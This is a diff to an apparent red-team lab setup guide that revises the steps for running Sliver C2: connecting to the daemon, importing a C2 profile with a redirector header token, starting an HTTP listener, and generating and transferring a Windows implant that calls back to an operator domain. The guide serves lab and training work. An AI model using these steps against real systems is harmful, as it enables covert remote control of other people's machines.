@@ -787,18 +787,23 @@ Two ways to get a shell on Sliver (pick one):
 > `ssh -i rs-rsa-key.pem -J admin@<GUAC_PUBLIC_IP> admin@sliver`
 > Get the Guacamole IP from `terraform output deployment_info`.
 
-### Step 5.2: Start Sliver Console and Create Listener
+### Step 5.2: Connect to Sliver and Create Listener
 
-Since Sliver runs on its own dedicated machine and you are connected directly via Guacamole or MobaXterm, launch the interactive server console:
+The Sliver daemon runs automatically as a systemd service on boot. Connect to it using the Sliver client:
 
 ```bash
-sudo /root/sliver-server
+sliver-client
 ```
 
-> [!TIP]
-> Exiting the Sliver console stops the server and drops all active listeners. To keep it running while working in the shell, use a `tmux` or `screen` session and detach from it (`Ctrl+B D` for tmux, `Ctrl+A D` for screen). For a persistent setup that survives disconnects, advanced users can run Sliver as a systemd service with `sudo systemctl enable --now sliver` and connect using the Sliver client binary.
+**On first login only** — import the pre-built C2 profile. This only needs to be done once per deployment since Sliver stores it in its database:
 
-**In the Sliver console:**
+```text
+sliver > c2profiles import --file /root/redstack-c2-profile.json --name redstack
+```
+
+The profile is generated at boot with the correct `X-Request-ID` token from your Terraform configuration, so no manual editing is needed.
+
+**Start the HTTP listener:**
 
 ```text
 sliver > http --lhost 0.0.0.0 --lport 80
@@ -813,13 +818,7 @@ This starts a plain HTTP listener on port 80. The implant connects over HTTPS to
 
 ### Step 5.3: Generate Implant
 
-First, import the pre-built C2 profile. This profile has the `X-Request-ID` validation header baked in so every implant callback automatically passes the redirector's header check:
-
-```text
-sliver > c2profiles import --file /root/redstack-c2-profile.json --name redstack
-```
-
-Then generate the implant using that profile:
+Generate the implant using the `redstack` C2 profile:
 
 ```text
 sliver > generate --http https://<YOUR_DOMAIN>/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/implant.exe
@@ -829,13 +828,7 @@ Replace `<YOUR_DOMAIN>` with your `redirector_domain` value from `terraform.tfva
 
 **Transfer the implant to the Windows workstation:**
 
-The implant is generated as root, so make it readable before transferring. In a second terminal on the Sliver machine (or via Guacamole):
-
-```bash
-sudo chmod 644 /tmp/implant.exe
-```
-
-Then from PowerShell on the Windows operator machine, SCP the file directly from Sliver without interrupting the Sliver console:
+From PowerShell on the Windows operator machine, SCP the file directly from Sliver without interrupting the Sliver console:
 
 ```powershell
 scp admin@sliver:/tmp/implant.exe C:\Users\Administrator\Desktop\implant.exe
